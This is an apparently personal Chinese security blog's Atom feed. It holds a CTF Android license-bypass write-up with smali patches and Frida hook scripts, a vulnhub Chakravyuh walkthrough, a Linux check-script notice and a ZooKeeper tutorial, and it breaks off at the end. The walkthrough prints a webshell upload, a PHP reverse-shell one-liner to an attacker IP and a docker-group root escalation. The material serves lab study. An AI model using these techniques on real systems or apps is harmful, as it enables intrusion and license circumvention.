<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Misaki&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="/"/>
  <updated>2019-11-25T09:24:43.449Z</updated>
  <id>/</id>
  
  <author>
    <name>Misaki</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hook WhyShouldIPay</title>
    <link href="/2019/11/Hook-WhyShouldIPay/"/>
    <id>/2019/11/Hook-WhyShouldIPay/</id>
    <published>2019-11-25T09:22:39.000Z</published>
    <updated>2019-11-25T09:24:43.449Z</updated>
    
    <content type="html"><![CDATA[<p>学习Frida的时候看到小肩膀视频中提到了一个apk，whyshouldipay。这个apk之前做过逆向分析修改，所以正好此处使用Frida来尝试HOOK。</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>把apk丢到jeb中，从mainfast文件。可以看到首页activity是LauncherActivity。找到首页activity，点击反编译。</p><p><img src="https://i.loli.net/2019/11/25/IAZ45F2iCPJzoWj.png" alt="1574664538019.png"></p><p>从代码中可以看到，其实是做了一次网络验证，但由于时间久远，这个apk貌似是16年的CTF使用，网址现在已经不能使用了。所以需要这里进行修改，利用AK来修改smail代码。重打包安装。</p><pre><code>.method public verifyClick(Landroid/view/View;)V    .locals 15    .line 39    .restart local v1    # &quot;b&quot;:[B    .restart local v2    # &quot;con&quot;:Ljava/net/URLConnection;    .restart local v5    # &quot;in&quot;:Ljava/io/InputStream;    .restart local v9    # &quot;responseBuilder&quot;:Ljava/lang/StringBuilder;    .restart local v11    # &quot;url&quot;:Ljava/net/URL;    :cond_0    const-string v8, &quot;LICENSEKEYOK&quot;    .line 40    #.local v8, &quot;response&quot;:Ljava/lang/String;    const-string v12, &quot;LICENSEKEYOK&quot;    invoke-virtual {v8, v12}, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z    move-result v12    if-eqz v12, :cond_1    .line 43    new-instance v0, Ljava/lang/String;    invoke-direct {p0}, Lde/fraunhofer/sit/premiumapp/LauncherActivity;-&gt;getMac()Ljava/lang/String;    move-result-object v12    invoke-virtual {v12}, Ljava/lang/String;-&gt;getBytes()[B    move-result-object v12    invoke-virtual {v8}, Ljava/lang/String;-&gt;getBytes()[B    move-result-object v13    invoke-static {v12, v13}, Lde/fraunhofer/sit/premiumapp/MainActivity;-&gt;xor([B[B)[B    move-result-object v12    invoke-direct {v0, v12}, Ljava/lang/String;-&gt;&lt;init&gt;([B)V    .line 44    .local v0, &quot;activatedKey&quot;:Ljava/lang/String;    invoke-virtual {p0}, Lde/fraunhofer/sit/premiumapp/LauncherActivity;-&gt;getApplicationContext()Landroid/content/Context;    move-result-object v12    const-string v13, &quot;preferences&quot;    const/4 v14, 0x0    invoke-virtual {v12, v13, v14}, Landroid/content/Context;-&gt;getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;    move-result-object v7    .line 45    .local v7, &quot;pref&quot;:Landroid/content/SharedPreferences;    invoke-interface {v7}, Landroid/content/SharedPreferences;-&gt;edit()Landroid/content/SharedPreferences$Editor;    move-result-object v4    .line 46    .local v4, &quot;editor&quot;:Landroid/content/SharedPreferences$Editor;    const-string v12, &quot;KEY&quot;    invoke-interface {v4, v12, v0}, Landroid/content/SharedPreferences$Editor;-&gt;putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;    .line 47    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;-&gt;commit()Z    .line 48    new-instance v12, Landroid/support/v7/app/AlertDialog$Builder;    invoke-direct {v12, p0}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;&lt;init&gt;(Landroid/content/Context;)V    const-string v13, &quot;Activation successful&quot;    .line 49    invoke-virtual {v12, v13}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;setTitle(Ljava/lang/CharSequence;)Landroid/support/v7/app/AlertDialog$Builder;    move-result-object v12    const-string v13, &quot;Activation successful&quot;    .line 50    invoke-virtual {v12, v13}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;setMessage(Ljava/lang/CharSequence;)Landroid/support/v7/app/AlertDialog$Builder;    move-result-object v12    const v13, 0x1080027    .line 51    invoke-virtual {v12, v13}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;setIcon(I)Landroid/support/v7/app/AlertDialog$Builder;    move-result-object v12    .line 52    invoke-virtual {v12}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;show()Landroid/support/v7/app/AlertDialog;    :cond_1    return-void.end method</code></pre><p>修改如上，重新给v8寄存器赋值。并且删除以上全部请求代码，清楚其他try的代码，不然其做HTTP请求验证。完整的verifyClick函数smail代码如上。至此网络验证的给去掉了。</p><p>点击verify，就会显示验证成功，然后写入本地数据保存key值。</p><p><img src="https://i.loli.net/2019/11/25/FqNsiJSWmjBV6ed.png" alt="1574671361120.png"></p><p>只不过这样修改，再点击premium的时候就是认证成功的了。</p><p><img src="https://i.loli.net/2019/11/25/6HZStIBWULOrNil.png" alt="1574671432194.png"></p><h3 id="Hook-函数"><a href="#Hook-函数" class="headerlink" title="Hook 函数"></a>Hook 函数</h3><p>那么先hook一下getMac和getKey函数，看一下返回是什么值。</p><pre><code>import frida, sysjscode = &quot;&quot;&quot;Java.perform(function(){    var lunc = Java.use(&#39;de.fraunhofer.sit.premiumapp.LauncherActivity&#39;);    lunc.getMac.implementation = function(){        send(&quot;HOOK Start....&quot;);        var sed = this.getMac();        send(sed);        var ser = this.getKey();        send(ser);        return sed;        }})&quot;&quot;&quot;def message(message, data):    if message[&quot;type&quot;] == &quot;send&quot;:        print(&quot;[*] {0}&quot;.format(message[&#39;payload&#39;]))    else:        print(message)process = frida.get_remote_device().attach(&#39;de.fraunhofer.sit.premiumapp&#39;)script = process.create_script(jscode)script.on(&quot;message&quot;, message)script.load()sys.stdin.read()</code></pre><p>在手机上打开Frida。转发端口27042。运行后获取到两个参数，一个是WiFi的Mac，一个是key。</p><p><img src="https://i.loli.net/2019/11/25/32dClO61LBqKiU5.png" alt="1574671869395.png"></p><p>然后按照修改返回参数来直接达到不修改apk的目的。</p><h3 id="Hook-直接获得结果"><a href="#Hook-直接获得结果" class="headerlink" title="Hook 直接获得结果"></a>Hook 直接获得结果</h3><p>从代码中就可以看到，当返回结果为LICENSEKEYOK时，调用MainActivity类下的xor方法。参数一个是上面的Mac的byte值，一个是LICENSEKEYOK的byte值。</p><pre><code>import frida, sysjscode = &quot;&quot;&quot;Java.perform(function(){        //字符串转byte        function stringToBytes(str) {              var ch, st, re = [];             for (var i = 0; i &lt; str.length; i++ ) {                 ch = str.charCodeAt(i);  // get char                  st = [];                 // set up &quot;stack&quot;                  do {                      st.push( ch &amp; 0xFF );  // push byte to stack                      ch = ch &gt;&gt; 8;          // shift value down by 1 byte                  }                    while ( ch );                  re = re.concat( st.reverse() );             }              return re;          }         //byte转字符串        function byteToString(arr) {            if(typeof arr === &#39;string&#39;) {                return arr;            }            var str = &#39;&#39;,                _arr = arr;            for(var i = 0; i &lt; _arr.length; i++) {                var one = _arr[i].toString(2),                    v = one.match(/^1+?(?=0)/);                if(v &amp;&amp; one.length == 8) {                    var bytesLength = v[0].length;                    var store = _arr[i].toString(2).slice(7 - bytesLength);                    for(var st = 1; st &lt; bytesLength; st++) {                        store += _arr[st + i].toString(2).slice(2);                    }                    str += String.fromCharCode(parseInt(store, 2));                    i += bytesLength - 1;                } else {                    str += String.fromCharCode(_arr[i]);                }            }            return str;        }    var lunc = Java.use(&#39;de.fraunhofer.sit.premiumapp.LauncherActivity&#39;);    var main = Java.use(&#39;de.fraunhofer.sit.premiumapp.MainActivity&#39;);    lunc.getKey.implementation = function(){        send(&quot;HOOK Start....&quot;);        var sed = this.getMac();        send(sed);                   //获取mac        var xor = main.xor(stringToBytes(sed), stringToBytes(&quot;LICENSEKEYOK&quot;));   //生成key        var ser = byteToString(xor);        send(ser);        return ser;        }})&quot;&quot;&quot;def message(message, data):    if message[&quot;type&quot;] == &quot;send&quot;:        print(&quot;[*] {0}&quot;.format(message[&#39;payload&#39;]))    else:        print(message)process = frida.get_remote_device().attach(&#39;de.fraunhofer.sit.premiumapp&#39;)script = process.create_script(jscode)script.on(&quot;message&quot;, message)script.load()sys.stdin.read()</code></pre><p>执行如上代码，即可Hook到key函数，然后由xor生成，来返回给getKey函数。返回如下所示。</p><p><img src="https://i.loli.net/2019/11/25/D1Z8BlvRaft6rAh.png" alt="1574673463247.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;学习Frida的时候看到小肩膀视频中提到了一个apk，whyshouldipay。这个apk之前做过逆向分析修改，所以正好此处使用Frida来尝试HOOK。&lt;/p&gt;
&lt;h3 id=&quot;逆向分析&quot;&gt;&lt;a href=&quot;#逆向分析&quot; class=&quot;headerlink&quot; title
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Linux主机安全检查脚本</title>
    <link href="/2019/11/Linux%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%84%9A%E6%9C%AC/"/>
    <id>/2019/11/Linux主机安全检查脚本/</id>
    <published>2019-11-22T07:36:57.000Z</published>
    <updated>2019-11-22T07:42:57.493Z</updated>
    
    <content type="html"><![CDATA[<h3 id="检查项"><a href="#检查项" class="headerlink" title="检查项"></a>检查项</h3><pre><code>0.检测命令是否被修改1.获取网络连接2.查看对外开放端口3.查看是否存在高危端口4.查看启动项5.查看定时任务6.查看调度任务7.检测cpu异常进程8.检测特权用户9.查看登陆用户10.可登录用户11.最近修改过的文件12.查看是否存在可疑命令13.root是否允许远程登陆14.检查是否存在可疑脚本15.日志文件打包16.查看登陆到主机的用户17.检查磁盘使用量</code></pre><p>以上检查项按照比较关心的项来写，在Ubuntu主机上测试，个别命令可能centos不带，需要提前安装。</p><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p>项目地址：<a href="https://github.com/MisakiKata/Linuxcheck" target="_blank" rel="noopener">https://github.com/MisakiKata/Linuxcheck</a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>其中还包括一批后门端口，利用来自：<a href="https://github.com/T0xst/linux/blob/master/checkrules/dangerstcpports.dat" target="_blank" rel="noopener">port列表</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;检查项&quot;&gt;&lt;a href=&quot;#检查项&quot; class=&quot;headerlink&quot; title=&quot;检查项&quot;&gt;&lt;/a&gt;检查项&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;0.检测命令是否被修改
1.获取网络连接
2.查看对外开放端口
3.查看是否存在高危端口
4.查看启动项
5.查看定
      
    
    </summary>
    
    
      <category term="shell" scheme="/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub Chakravyuh</title>
    <link href="/2019/11/vulnhub-Chakravyuh/"/>
    <id>/2019/11/vulnhub-Chakravyuh/</id>
    <published>2019-11-15T07:15:22.000Z</published>
    <updated>2019-11-25T09:30:06.073Z</updated>
    
    <content type="html"><![CDATA[<p>修改网络连接方式为DHCP</p><p>按照虚拟机网段查找分配的IP，此处分配的IP为192.168.120.138</p><h2 id="信息发现"><a href="#信息发现" class="headerlink" title="信息发现"></a>信息发现</h2><p>按照惯例，首先把主机开放端口扫描，发现开放端口为80、22、65530。其中65530是一个ftp服务，连接发现无密码，文件夹pub下存在一个arjun.7z的压缩包。</p><p><img src="https://i.loli.net/2019/11/15/skYyTa64x5tFiwp.png" alt="1573710199259.png"></p><p>访问80端口，就一张图片，扫描路径，发现phpmyadmin。无空密码。</p><p><img src="https://i.loli.net/2019/11/15/BSExeVdhqk5K8jX.png" alt="1573710258221.png"></p><p><img src="https://i.loli.net/2019/11/15/7UdzvtM8eFGWHrh.png" alt="1573710267644.png"></p><h3 id="爆破压缩包"><a href="#爆破压缩包" class="headerlink" title="爆破压缩包"></a>爆破压缩包</h3><p>到此，需要一个能登陆phpmyadmin的账号密码。尝试爆破7z压缩包。利用一个小脚本爆破。</p><p>根据脚本的建议，需要一份字典，<code>rockyou</code> or <code>crackstation</code>。是kali上的字典，但是手头没有kali。直接搜索下载。</p><p><a href="https://www.scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt" target="_blank" rel="noopener">https://www.scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt</a></p><p>爆破是贼慢，但是密码成功出来了，是family。打开是一个secret.txt文件，里面有一个类似base64加密的字符串。</p><p><img src="https://i.loli.net/2019/11/15/rden5chWPaXNmzH.png" alt="1573716758046.png"></p><p>字符串为以下，看起来是账号：邮箱：密码。不过遗憾的是，并不能登陆phpmyadmin。那这个字符串就可能是字段：账号：密码的形式。</p><pre><code>Z2lsYTphZG1pbkBnbWFpbC5jb206cHJpbmNlc2E=解码为：gila:admin@gmail.com:princesa</code></pre><h2 id="利用已知漏洞"><a href="#利用已知漏洞" class="headerlink" title="利用已知漏洞"></a>利用已知漏洞</h2><p>后来试一下路径，发现存在这个一个地址，gila是一个cms。</p><pre><code>http://192.168.120.138/gila/</code></pre><p><img src="https://i.loli.net/2019/11/15/C3tO6HmuqhbzSZj.png" alt="1573788590873.png"><br>到官方网站，找到了官方给的demo站，后台地址是加admin。尝试是否也是admin。</p><pre><code>http://192.168.120.138/gila/admin</code></pre><p><img src="https://i.loli.net/2019/11/15/j2xpDA1v7XqBkoT.png" alt="1573788693246.png"></p><p>登陆后，看到版本为1.10.9。基本可以确定是一个后台获取webshell的利用方式，搜索谷歌，查找一下是否有已知的漏洞。在exploit-db上找到了一个本地文件包含漏洞。尝试确实存在，而已可以上传文件。查看一下发现是content下的文件管理功能。</p><pre><code>http://192.168.120.138/gila/admin/fm?f=./..</code></pre><p><img src="https://i.loli.net/2019/11/15/ig9yuJs3EHr7mpS.png" alt="1573788989941.png"></p><h3 id="利用上传文件"><a href="#利用上传文件" class="headerlink" title="利用上传文件"></a>利用上传文件</h3><p>创建新文件后门。在assert文件夹下，但是php文件不能访问，需要修改.htaccess文件。</p><p><img src="https://i.loli.net/2019/11/15/HpAKf6RXyNrShJ2.png" alt="1573789346619.png"></p><p>修改为<code>Allow from all</code>，即可访问上传的文件。</p><p><img src="https://i.loli.net/2019/11/15/2jIiJDk3G4yagWz.png" alt="1573789391147.png"></p><h2 id="反弹shell获取权限"><a href="#反弹shell获取权限" class="headerlink" title="反弹shell获取权限"></a>反弹shell获取权限</h2><p>利用php反弹shell</p><pre><code>php -r &#39;$sock=fsockopen(&quot;192.168.30.79&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;#升级shellpython -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; </code></pre><p><img src="https://i.loli.net/2019/11/15/L7qnsAzGgY3T9df.png" alt="1573798182649.png"></p><p>从id命令看到www-data是docker组的成员，而docker是可以免密码操作sudo的。详细参考</p><p><a href="https://www.freebuf.com/articles/system/170783.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/170783.html</a></p><p>借助一个docker镜像，查看本机存在一个alpine镜像</p><p><img src="https://i.loli.net/2019/11/15/QkOp8Kcxt6MnfBP.png" alt="1573799916611.png"></p><p>采用-v的目录映射，此处修改为/root:/root，运行进入docker内部</p><pre><code>docker run -it --rm -v /root:/root alpine</code></pre><p><img src="https://i.loli.net/2019/11/15/192nqWMVgFcBtrS.png" alt="1573800551863.png"></p><p>找到root下的文件，打开即可</p><p><img src="https://i.loli.net/2019/11/15/bBqVHw2TS7k3smR.png" alt="1573800574456.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;修改网络连接方式为DHCP&lt;/p&gt;
&lt;p&gt;按照虚拟机网段查找分配的IP，此处分配的IP为192.168.120.138&lt;/p&gt;
&lt;h2 id=&quot;信息发现&quot;&gt;&lt;a href=&quot;#信息发现&quot; class=&quot;headerlink&quot; title=&quot;信息发现&quot;&gt;&lt;/a&gt;信息发现&lt;/h
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>ZooKeeper</title>
    <link href="/2019/11/ZooKeeper/"/>
    <id>/2019/11/ZooKeeper/</id>
    <published>2019-11-15T07:11:39.000Z</published>
    <updated>2019-11-15T08:08:28.999Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是Apache-ZooKeeper？"><a href="#什么是Apache-ZooKeeper？" class="headerlink" title="什么是Apache ZooKeeper？"></a>什么是Apache ZooKeeper？</h2><p>Apache ZooKeeper是由集群（节点组）使用的一种服务，用于在自身之间协调，并通过稳健的同步技术维护共享数据。ZooKeeper本身是一个分布式应用程序，为写入分布式应用程序提供服务。</p><p>ZooKeeper提供的常见服务如下 :</p><ul><li><strong>命名服务</strong> - 按名称标识集群中的节点。它类似于DNS，但仅对于节点。</li><li><strong>配置管理</strong> - 加入节点的最近的和最新的系统配置信息。</li><li><strong>集群管理</strong> - 实时地在集群和节点状态中加入/离开节点。</li><li><strong>选举算法</strong> - 选举一个节点作为协调目的的leader。</li><li><strong>锁定和同步服务</strong> - 在修改数据的同时锁定数据。此机制可帮助你在连接其他分布式应用程序（如Apache HBase）时进行自动故障恢复。</li><li><strong>高度可靠的数据注册表</strong> - 即使在一个或几个节点关闭时也可以获得数据。</li></ul><p>分布式应用程序提供了很多好处，但它们也抛出了一些复杂和难以解决的挑战。ZooKeeper框架提供了一个完整的机制来克服所有的挑战。竞争条件和死锁使用<strong>故障安全同步方法</strong>进行处理。另一个主要缺点是数据的不一致性，ZooKeeper使用<strong>原子性</strong>解析。</p><h2 id="ZooKeeper的好处"><a href="#ZooKeeper的好处" class="headerlink" title="ZooKeeper的好处"></a>ZooKeeper的好处</h2><p>以下是使用ZooKeeper的好处：</p><ul><li><strong>简单的分布式协调过程</strong></li><li><strong>同步</strong> - 服务器进程之间的相互排斥和协作。此过程有助于Apache HBase进行配置管理。</li><li><strong>有序的消息</strong></li><li><strong>序列化</strong> - 根据特定规则对数据进行编码。确保应用程序运行一致。这种方法可以在MapReduce中用来协调队列以执行运行的线程。</li><li><strong>可靠性</strong></li><li><strong>原子性</strong> - 数据转移完全成功或完全失败，但没有事务是部分的。</li></ul><h2 id="Java环境"><a href="#Java环境" class="headerlink" title="Java环境"></a>Java环境</h2><p>最新版zookeeper需要Java1.8.211以上。</p><p>比如利用源安装</p><pre><code>yum install java-1.8.0-openjdk.x86_64java -versionopenjdk version &quot;1.8.0_232&quot;</code></pre><h2 id="ZooKeeper"><a href="#ZooKeeper" class="headerlink" title="ZooKeeper"></a>ZooKeeper</h2><p>地址：<a href="https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.5.6/apache-zookeeper-3.5.6-bin.tar.gz" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.5.6/apache-zookeeper-3.5.6-bin.tar.gz</a></p><p>解压缩，进入conf目录修改zoo-sample.cfg文件为zoo.cfg文件。</p><p>打开文件，修改路径，类似如下</p><pre><code># The number of milliseconds of each ticktickTime=2000# The number of ticks that the initial# synchronization phase can takeinitLimit=10# The number of ticks that can pass between# sending a request and getting an acknowledgementsyncLimit=5# the directory where the snapshot is stored.# do not use /tmp for storage, /tmp here is just# example sakes.dataDir=/data/zookeeper# the port at which the clients will connectclientPort=2181# the maximum number of client connections.# increase this if you need to handle more clients#maxClientCnxns=60## Be sure to read the maintenance section of the# administrator guide before turning on autopurge.## http://zookeeper.apache.org/doc/current/zookeeperAdmin.html#sc_maintenance## The number of snapshots to retain in dataDir#autopurge.snapRetainCount=3# Purge task interval in hours# Set to &quot;0&quot; to disable auto purge feature#autopurge.purgeInterval=1</code></pre><p>保存，到bin目录下执行</p><pre><code>[root@VM_0_6_centos bin]# ./zkServer.sh start/usr/bin/javaZooKeeper JMX enabled by defaultUsing config: /root/apache-zookeeper-3.5.6-bin/bin/../conf/zoo.cfgStarting zookeeper ... STARTED</code></pre><p>开始服务后，启动cli端。</p><pre><code>[root@VM_0_6_centos bin]# ./zkCli.sh /usr/bin/javaConnecting to localhost:2181</code></pre><h3 id="创建Znode节点"><a href="#创建Znode节点" class="headerlink" title="创建Znode节点"></a>创建Znode节点</h3><pre><code>create /path /dataeg: [zk: localhost:2181(CONNECTED) 4] create /datapp zookapp    Created /datapp</code></pre><h3 id="创建顺序节点"><a href="#创建顺序节点" class="headerlink" title="创建顺序节点"></a>创建顺序节点</h3><pre><code>create -e /path /dataeg: [zk: localhost:2181(CONNECTED) 5] create -s /datapp zookapp    Created /datapp0000000003</code></pre><h3 id="删除节点"><a href="#删除节点" class="headerlink" title="删除节点"></a>删除节点</h3><pre><code>[zk: localhost:2181(CONNECTED) 6] delete /datapp [zk: localhost:2181(CONNECTED) 7] ls /datappNode does not exist: /datapp#删除带子节点的节点[zk: localhost:2181(CONNECTED) 30] ls /datapp[sec][zk: localhost:2181(CONNECTED) 33] deleteall /datapp[zk: localhost:2181(CONNECTED) 34] </code></pre><h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><pre><code>[zk: localhost:2181(CONNECTED) 11] get /datapp zookapp[zk: localhost:2181(CONNECTED) 13] get -s /datapp    #查看全部数据zookappcZxid = 0xcctime = Thu Nov 07 11:10:41 CST 2019mZxid = 0xcmtime = Thu Nov 07 11:10:41 CST 2019pZxid = 0xccversion = 0dataVersion = 0aclVersion = 0ephemeralOwner = 0x0dataLength = 7numChildren = 0[zk: localhost:2181(CONNECTED) 18] set /datapp zookupdate   #设置更改WATCHER::WatchedEvent state:SyncConnected type:NodeDataChanged path:/datapp[zk: localhost:2181(CONNECTED) 19] get -w /datapp    #查看更改zookupdate[zk: localhost:2181(CONNECTED) 20] set /datapp cversion=1WATCHER::WatchedEvent state:SyncConnected type:NodeDataChanged path:/datapp[zk: localhost:2181(CONNECTED) 21] get -w /datappcversion=1</code></pre><h3 id="设置数据"><a href="#设置数据" class="headerlink" title="设置数据"></a>设置数据</h3><pre><code>[zk: localhost:2181(CONNECTED) 18] set /datapp zookupdateWATCHER::WatchedEvent state:SyncConnected type:NodeDataChanged path:/datapp[zk: localhost:2181(CONNECTED) 19] get -w /datappzookupdate</code></pre><h3 id="创建子节点"><a href="#创建子节点" class="headerlink" title="创建子节点"></a>创建子节点</h3><pre><code>[zk: localhost:2181(CONNECTED) 28] create /datapp zookappCreated /datapp[zk: localhost:2181(CONNECTED) 29] create /datapp/sec zookapp2Created /datapp/sec[zk: localhost:2181(CONNECTED) 30] ls /datapp[sec][zk: localhost:2181(CONNECTED) 31] get /datappzookapp[zk: localhost:2181(CONNECTED) 32] get /datapp/seczookapp2</code></pre><h2 id="Zookeeper集群部署"><a href="#Zookeeper集群部署" class="headerlink" title="Zookeeper集群部署"></a>Zookeeper集群部署</h2><p>此处利用一台主机模拟两个zookeeper部署，在root目录下创建两个文件夹， 一个为zookeeper1，一个为zookeeper2。而实际环境中最小需要三个节点，最好是奇数节点。</p><p>创建data目录，在conf配置文件中修改如下，端口由于是在一台主机上，所以需要不同的端口，正常形式下，可以设置为不同IP同端口。</p><pre><code># The number of milliseconds of each ticktickTime=2000# The number of ticks that the initial# synchronization phase can takeinitLimit=10# The number of ticks that can pass between# sending a request and getting an acknowledgementsyncLimit=5# the directory where the snapshot is stored.# do not use /tmp for storage, /tmp here is just# example sakes.dataDir=/data/zookeeper1# the port at which the clients will connectclientPort=2181# the maximum number of client connections.# increase this if you need to handle more clients#maxClientCnxns=60## Be sure to read the maintenance section of the# administrator guide before turning on autopurge.## http://zookeeper.apache.org/doc/current/zookeeperAdmin.html#sc_maintenance## The number of snapshots to retain in dataDir#autopurge.snapRetainCount=3# Purge task interval in hours# Set to &quot;0&quot; to disable auto purge feature#autopurge.purgeInterval=1server.1=127.0.0.1:7788:8890server.2=127.0.0.1:7789:8891</code></pre><h3 id="创建data-myid文件"><a href="#创建data-myid文件" class="headerlink" title="创建data/myid文件"></a>创建data/myid文件</h3><p>创建文件myid，写入配置文件中的server名。文件的存在位置跟配置文件中的dataDir一致。</p><pre><code>[root@VM_0_6_centos zookeeper1]# echo &quot;1&quot; &gt; myid[root@VM_0_6_centos zookeeper1]# lsmyid</code></pre><p>分别启动后查看状态可以发现，已经选举了一个为leader</p><pre><code>[root@VM_0_6_centos zookeeper2]# ./bin/zkServer.sh status/usr/bin/javaZooKeeper JMX enabled by defaultUsing config: /root/zookeeper2/bin/../conf/zoo.cfgClient port found: 2182. Client address: localhost.Mode: leader[root@VM_0_6_centos zookeeper1]# ./bin/zkServer.sh status/usr/bin/javaZooKeeper JMX enabled by defaultUsing config: /root/zookeeper1/bin/../conf/zoo.cfgClient port found: 2181. Client address: localhost.Mode: follower</code></pre><p>在leader端修改数据，新建znode节点</p><pre><code>[zk: localhost:2181(CONNECTED) 0] create /datapp idsignCreated /datapp[zk: localhost:2181(CONNECTED) 1] follow端[zk: localhost:2181(CONNECTED) 0] get /datappidsign[zk: localhost:2181(CONNECTED) 1]</code></pre><p>follow端修改数据，leader端同步到数据，向其他follow写入数据</p><pre><code>[zk: localhost:2181(CONNECTED) 1] set /datapp idsign=xxxx[zk: localhost:2181(CONNECTED) 0] get /datappidsign=xxxx[zk: localhost:2181(CONNECTED) 1] </code></pre><h2 id="ZooKeeper-API"><a href="#ZooKeeper-API" class="headerlink" title="ZooKeeper API"></a>ZooKeeper API</h2><p>官方提供了绑定Java和C的API，此处不做使用解释。以下以python的API使用为例。</p><p>Java版文档：<a href="http://zookeeper.apache.org/doc/r3.3.3/api/org/apache/zookeeper/ZooKeeper.html" target="_blank" rel="noopener">http://zookeeper.apache.org/doc/r3.3.3/api/org/apache/zookeeper/ZooKeeper.html</a></p><p>Java示例：<a href="https://blog.csdn.net/u013468915/article/details/80878490" target="_blank" rel="noopener">https://blog.csdn.net/u013468915/article/details/80878490</a></p><p>python版文档：<a href="https://kazoo.readthedocs.io/en/latest/install.html" target="_blank" rel="noopener">https://kazoo.readthedocs.io/en/latest/install.html</a></p><pre><code>pip install kazoo  #安装kazoo</code></pre><p>连接到ZooKeeper</p><pre><code>from kazoo.client import KazooClientzk = KazooClient(hosts=&#39;106.54.181.187:2181&#39;)   #连接zk.start()</code></pre><p>节点状态</p><pre><code>from kazoo.client import KazooStatedef my_listener(state):    if state == KazooState.LOST:        print(&#39;ZooKeeper Lost&#39;)                     # 状态为丢失时    elif state == KazooState.SUSPENDED:        print(&#39;ZooKeeper Suspended&#39;)                # 状态为暂停    else:        print(&#39;ZooKeeper Connect&#39;)                  # 状态为连接中zk.add_listener(my_listener)</code></pre><p>Zookeeper 3.4及更高版本支持只读模式。 必须为Zookeeper集群中的服务器打开此模式，客户端才能使用它。 要将这种模式与Kazoo一起使用，应在read_only选项设置为True的情况下调用KazooClient。 这将使客户端连接到已变为只读的Zookeeper节点，并且客户端将继续扫描其他可读写的节点。</p><pre><code>from kazoo.client import KazooClientfrom kazoo.client import KazooStatefrom kazoo.client import KeeperStatezk = KazooClient(hosts=&#39;127.0.0.1:2181&#39;, read_only=True)zk.start()@zk.add_listenerdef watch_for_ro(state):    if state == KazooState.CONNECTED:        if zk.client_state == KeeperState.CONNECTED_RO:            print(&quot;Read only mode!&quot;)        else:            print(&quot;Read/Write mode!&quot;)</code></pre><p>创建节点，使用的方法有<code>ensure_path()</code>和<code>create()</code></p><pre><code># 确定路径，在必要时创建zk.ensure_path(&quot;/my/favorite&quot;)# 用数据创建一个节点zk.create(&quot;/my/favorite/node&quot;, b&quot;a value&quot;)</code></pre><p>读取节点信息</p><pre><code>exists() 检查节点是否存在。get() 在ZnodeStat结构中获取节点的数据以及详细的节点信息。get_children() 获取给定节点的子级列表eg:if zk.exists(&quot;/my/favorite&quot;):         #判断/my/favorite是否存在data, stat = zk.get(&quot;/my/favorite&quot;)        #查看节点信息print(&quot;Version: %s, data: %s&quot; % (stat.version, data.decode(&quot;utf-8&quot;)))children = zk.get_children(&quot;/my/favorite&quot;)  #查看节点的子节点信息print(&quot;There are %s children with names %s&quot; % (len(children), children))</code></pre><p>更新节点信息</p><pre><code>zk.set(&quot;/my/favorite&quot;, b&quot;some data&quot;)</code></pre><p>删除节点信息</p><pre><code>zk.delete(&quot;/my/favorite/node&quot;, recursive=True)</code></pre><p>重试命令</p><pre><code>result = zk.retry(zk.get, &quot;/path/to/node&quot;)相当于执行zk.get(&#39;/path/to/node&#39;)</code></pre><p>利用如上信息，编写操作ZooKeeper的Python脚本</p><pre><code>#coding:utf-8from kazoo.client import KazooClientclass zoocon:    def __init__(self):        self.zk = KazooClient(hosts=&#39;106.54.181.187:2181&#39;)   #连接        self.zk.start()        self.path = &#39;/datapp&#39;    def get_data(self):        res = self.zk.get(self.path)        print(res)    def exist(self):        self.zk.exists(self.path)        return True    def create_data(self):        self.zk.create(self.path, b&#39;signapp&#39;)    def close(self):        self.zk.close()    def delete(self):        self.zk.delete(self.path, recursive=True)if __name__ == &#39;__main__&#39;:    zks = zoocon()    if zks.exist():        zks.delete()        zks.close()        print &#39;path delete&#39;    else:        zks.create_data()        zks.get_data()        zks.close()</code></pre><p>服务端存在datapp节点，运行后删除节点，当在服务器查看时，显示如下</p><pre><code>[zk: localhost:2181(CONNECTED) 0] get /datapporg.apache.zookeeper.KeeperException$NoNodeException: KeeperErrorCode = NoNode for /datapp</code></pre>]]></content>
    
    <summary type="html">
    
      
      
